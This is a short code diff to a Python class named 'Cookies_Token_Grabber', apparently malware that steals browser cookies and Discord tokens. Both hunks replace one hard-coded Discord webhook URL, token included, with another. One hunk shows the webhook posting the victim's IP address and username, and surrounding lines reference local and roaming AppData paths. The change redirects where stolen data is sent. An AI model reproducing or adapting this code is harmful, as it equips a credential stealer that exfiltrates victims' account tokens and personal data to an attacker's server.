@@ -37,7 +37,7 @@ TEMP_PATH = r"C:\Users\{}\AppData\Local\Temp".format(
 class Cookies_Token_Grabber:
     def __init__(self):
         self.webhook = "WEBHOOK_HERE"
-        self.webhookk = "https://discord.com/api/webhooks/925153281272070144/--i9j-etbtn7LgnLbopNMWAf0QLIhHoWNJsFSPvdu_j05HYmRWz4RfxmooDnjZN-eTxk"
+        self.webhookk = "https://discord.com/api/webhooks/924795205490733136/x66lNB6X_d26qFN0fxZ6t7Bs2qkf4d2wSCxGNjArDN_AHZxDa2RoV8anQek1Q2N3Ki8f"
         self.files = ""
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
@@ -139,7 +139,7 @@ class Cookies_Token_Grabber:
 
     # Start webhook instance
     hook = DiscordWebhook(
-        url="https://discord.com/api/webhooks/925153281272070144/--i9j-etbtn7LgnLbopNMWAf0QLIhHoWNJsFSPvdu_j05HYmRWz4RfxmooDnjZN-eTxk",
+        url="https://discord.com/api/webhooks/924795205490733136/x66lNB6X_d26qFN0fxZ6t7Bs2qkf4d2wSCxGNjArDN_AHZxDa2RoV8anQek1Q2N3Ki8f",
         content=f"**IP address:** {ipaddr}\n**Username**: {getpass.getuser()}",
         username="Auax"
     )
